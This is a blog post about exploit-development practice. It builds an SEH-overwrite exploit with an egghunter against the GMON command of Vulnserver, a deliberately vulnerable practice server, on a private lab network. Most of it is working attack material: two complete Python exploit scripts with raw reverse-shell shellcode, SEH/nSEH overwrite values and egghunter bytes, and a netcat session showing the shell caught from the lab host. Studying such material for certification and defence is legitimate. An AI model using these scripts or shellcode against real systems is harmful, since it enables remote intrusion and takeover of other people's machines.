---
layout: post
title: CTP/OSCE Prep -- 'GMON' Egghunter Exploit in Vulnserver
date: 2019-5-27
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - egghunter
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post, we will become acquainted with an SEH-based overflow with the `GMON` command/parameter in Vulnserver. 

If you have not already done so, please read the first post of this series so that you can setup your environment, setup and use `boofuzz`, and become acquainted with some of the stack-based overflow concepts that are still relevant in this post. You can do so [here](https://h0mbre.github.io/Boofuzz_to_EIP_Overwrite/).

**This post will assume the reader is already familiar with how to attach processes in Immunity, use boofuzz, search for bad characters, and other knowledge domains covered in the first post of the series.**

## Background

If you have not done so, it's probably best that you read our first approach to exploiting the 'GMON' command in Vulnserver with an SEH-based exploit [here](https://h0mbre.github.io/SEH_Based_Exploit/#). 

In summary:
Our exploit code looked like this:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

Seh = '\x2b\x17\x50\x62'
nSeh = '\xeb\x06\x90\x90'
jump = '\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1'

shellcode = ("\xdb\xcc\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbf\x36\x08\x50"
"\xc1\x31\x7a\x17\x83\xc2\x04\x03\x4c\x1b\xb2\x34\x4c\xf3\xb0"
"\xb7\xac\x04\xd5\x3e\x49\x35\xd5\x25\x1a\x66\xe5\x2e\x4e\x8b"
"\x8e\x63\x7a\x18\xe2\xab\x8d\xa9\x49\x8a\xa0\x2a\xe1\xee\xa3"
"\xa8\xf8\x22\x03\x90\x32\x37\x42\xd5\x2f\xba\x16\x8e\x24\x69"
"\x86\xbb\x71\xb2\x2d\xf7\x94\xb2\xd2\x40\x96\x93\x45\xda\xc1"
"\x33\x64\x0f\x7a\x7a\x7e\x4c\x47\x34\xf5\xa6\x33\xc7\xdf\xf6"
"\xbc\x64\x1e\x37\x4f\x74\x67\xf0\xb0\x03\x91\x02\x4c\x14\x66"
"\x78\x8a\x91\x7c\xda\x59\x01\x58\xda\x8e\xd4\x2b\xd0\x7b\x92"
"\x73\xf5\x7a\x77\x08\x01\xf6\x76\xde\x83\x4c\x5d\xfa\xc8\x17"
"\xfc\x5b\xb5\xf6\x01\xbb\x16\xa6\xa7\xb0\xbb\xb3\xd5\x9b\xd3"
"\x70\xd4\x23\x24\x1f\x6f\x50\x16\x80\xdb\xfe\x1a\x49\xc2\xf9"
"\x5d\x60\xb2\x95\xa3\x8b\xc3\xbc\x67\xdf\x93\xd6\x4e\x60\x78"
"\x26\x6e\xb5\x2f\x76\xc0\x66\x90\x26\xa0\xd6\x78\x2c\x2f\x08"
"\x98\x4f\xe5\x21\x33\xaa\x6e\x8e\x6c\xb5\xa9\x66\x6f\xb5\x34"
"\xcc\xe6\x53\x5c\x22\xaf\xcc\xc9\xdb\xea\x86\x68\x23\x21\xe3"
"\xab\xaf\xc6\x14\x65\x58\xa2\x06\x12\xa8\xf9\x74\xb5\xb7\xd7"
"\x10\x59\x25\xbc\xe0\x14\x56\x6b\xb7\x71\xa8\x62\x5d\x6c\x93"
"\xdc\x43\x6d\x45\x26\xc7\xaa\xb6\xa9\xc6\x3f\x82\x8d\xd8\xf9"
"\x0b\x8a\x8c\x55\x5a\x44\x7a\x10\x34\x26\xd4\xca\xeb\xe0\xb0"
"\x8b\xc7\x32\xc6\x93\x0d\xc5\x26\x25\xf8\x90\x59\x8a\x6c\x15"
"\x22\xf6\x0c\xda\xf9\xb2\x2d\x39\x2b\xcf\xc5\xe4\xbe\x72\x88"
"\x16\x15\xb0\xb5\x94\x9f\x49\x42\x84\xea\x4c\x0e\x02\x07\x3d"
"\x1f\xe7\x27\x92\x20\x22")

buffer = '\x90' * (3514 - len(shellcode))
buffer += shellcode
buffer += nSeh
buffer += Seh
buffer += jump
buffer += 'C' * (5012 - len(buffer))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()
```

Performed the following: 
1. causes an exception by overflowing the application's buffer;
2. the overflow also overwrites the SEH component;
3. we place a `POP POP RET` instruction in the 'Current SE handler' address;
4. the `POP POP RET` instruction places code execution at the pointer pointing towards the next SEH record;
5. this address has been overwritten with instructions to jump forward 6 bytes;
6. after jumping forward 6 bytes, the instruction at this location tells execution to jump backwards 768 bytes;
7. after jumping 768 bytes, we slide down a NOP sled to our shellcode at the end of our NOP sled buffer; and finally
8. the program executes our shellcode. 

![](/assets/images/CTP/finalDiag.JPG)

## Introducing an Egghunter

Instead of jumping back 768 bytes with our 'POP ECX - decrement - decrement - decrement - jump to ECX', we could also simply squeeze an [egghunter](https://h0mbre.github.io/SLAE_Egg_Hunter/) into our `C` buffer that we're jumping 6 bytes forward into. So we'd end up
+ jumping 6 bytes from the 'Pointer to the next SEH record'
+ land on an egghunter that looks for the shellcode prepended twice with our egg
+ have the egghunter find our shellcode in the `A` buffer and execute. 

Here is what we looked like sitting in the 'Pointer to the next SEH record' which at the time was filled with `B` values:

![](/assets/images/CTP/ourHome.JPG)

As you can see, there's quite a bit of space in the `C` buffer to work with.

## Mona Makes an Egg

Mona again shows us how awesome it is when we use it to generate egghunter shellcode along with a tag argument that we will prepend to our main payload shellcode. We can use the `!mona egg -t EGGH` which will output us this nice little `egghunter.txt` in `C:\Program Files\Immunity Inc\Immunity Debugger`:

![](/assets/images/CTP/ehtxt.JPG)

So now we have a nice 32-byte egghunter to fit inside our `C` buffer. 

## Putting It All Together

Since we aren't haphazardly jumping back to a spot in the `A` buffer this time, we don't need to convert the `A` values to NOPs. This approach is more surgical in nature. The `A` values can remain. 

All that's left for us to do is:
+ create an `egghunter` variable in our exploit script
+ create an `egg` variable ('EGGH x2 so that the egghunter doesn't find itself!)
+ complete our exploit so that it sends in order: `A` values \| egg \| shellcode \| nSeh \| Seh \| egghunter \| `C` values

After doing so, we end up with the following exploit code:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

Seh = '\x2b\x17\x50\x62'
nSeh = '\xeb\x06\x90\x90'
egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x45\x47\x47\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

egg = 'EGGHEGGH'
shellcode = ("\xdb\xcc\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xbf\x36\x08\x50"
"\xc1\x31\x7a\x17\x83\xc2\x04\x03\x4c\x1b\xb2\x34\x4c\xf3\xb0"
"\xb7\xac\x04\xd5\x3e\x49\x35\xd5\x25\x1a\x66\xe5\x2e\x4e\x8b"
"\x8e\x63\x7a\x18\xe2\xab\x8d\xa9\x49\x8a\xa0\x2a\xe1\xee\xa3"
"\xa8\xf8\x22\x03\x90\x32\x37\x42\xd5\x2f\xba\x16\x8e\x24\x69"
"\x86\xbb\x71\xb2\x2d\xf7\x94\xb2\xd2\x40\x96\x93\x45\xda\xc1"
"\x33\x64\x0f\x7a\x7a\x7e\x4c\x47\x34\xf5\xa6\x33\xc7\xdf\xf6"
"\xbc\x64\x1e\x37\x4f\x74\x67\xf0\xb0\x03\x91\x02\x4c\x14\x66"
"\x78\x8a\x91\x7c\xda\x59\x01\x58\xda\x8e\xd4\x2b\xd0\x7b\x92"
"\x73\xf5\x7a\x77\x08\x01\xf6\x76\xde\x83\x4c\x5d\xfa\xc8\x17"
"\xfc\x5b\xb5\xf6\x01\xbb\x16\xa6\xa7\xb0\xbb\xb3\xd5\x9b\xd3"
"\x70\xd4\x23\x24\x1f\x6f\x50\x16\x80\xdb\xfe\x1a\x49\xc2\xf9"
"\x5d\x60\xb2\x95\xa3\x8b\xc3\xbc\x67\xdf\x93\xd6\x4e\x60\x78"
"\x26\x6e\xb5\x2f\x76\xc0\x66\x90\x26\xa0\xd6\x78\x2c\x2f\x08"
"\x98\x4f\xe5\x21\x33\xaa\x6e\x8e\x6c\xb5\xa9\x66\x6f\xb5\x34"
"\xcc\xe6\x53\x5c\x22\xaf\xcc\xc9\xdb\xea\x86\x68\x23\x21\xe3"
"\xab\xaf\xc6\x14\x65\x58\xa2\x06\x12\xa8\xf9\x74\xb5\xb7\xd7"
"\x10\x59\x25\xbc\xe0\x14\x56\x6b\xb7\x71\xa8\x62\x5d\x6c\x93"
"\xdc\x43\x6d\x45\x26\xc7\xaa\xb6\xa9\xc6\x3f\x82\x8d\xd8\xf9"
"\x0b\x8a\x8c\x55\x5a\x44\x7a\x10\x34\x26\xd4\xca\xeb\xe0\xb0"
"\x8b\xc7\x32\xc6\x93\x0d\xc5\x26\x25\xf8\x90\x59\x8a\x6c\x15"
"\x22\xf6\x0c\xda\xf9\xb2\x2d\x39\x2b\xcf\xc5\xe4\xbe\x72\x88"
"\x16\x15\xb0\xb5\x94\x9f\x49\x42\x84\xea\x4c\x0e\x02\x07\x3d"
"\x1f\xe7\x27\x92\x20\x22")


buffer = 'A' * (3514 - len(egg + shellcode))
buffer += egg
buffer += shellcode
buffer += nSeh
buffer += Seh
buffer += egghunter
buffer += 'C' * (5012 - len(buffer))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("GMON /.../" + buffer)
print s.recv(1024)
s.close()
```

Using this exploit against Vulnserver (not being debugged in Immunity) nets us our reverse shell! Excellent. 

```terminal_session
astrid:~/ # nc -lvp 443    
listening on [any] 443 ...
192.168.1.201: inverse host lookup failed: Unknown host
connect to [192.168.1.199] from (UNKNOWN) [192.168.1.201] 49178
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>
```

## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 

## Resources

+ [Corelan SEH](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
+ [Infosec Institute SEH tutorial](https://resources.infosecinstitute.com/seh-exploit/#gref)
+ [sh3llc0d3r's GMON SEH Overwrite Walkthrough](http://sh3llc0d3r.com/vulnserver-gmon-command-seh-based-overflow-exploit/)
+ [Doylersec's LTER SEH Overwrite Walkthrough](https://www.doyler.net/security-not-included/vulnserver-lter-seh)
+ [Capt Meelo's GMON SEH Overwrite Walkthrough](https://captmeelo.com/exploitdev/osceprep/2018/06/30/vulnserver-gmon.html)
+ [Muts' 2004 Exploit](https://www.exploit-db.com/exploits/1378)
+ [Wallpaper](http://i.imgur.com/Mr9pvq9.jpg)
+ [Dimitrios Kalemis Wonderful Blogpost](https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/)
+ [Tulpa OSCE Guide](https://tulpa-security.com/2017/07/18/288/)
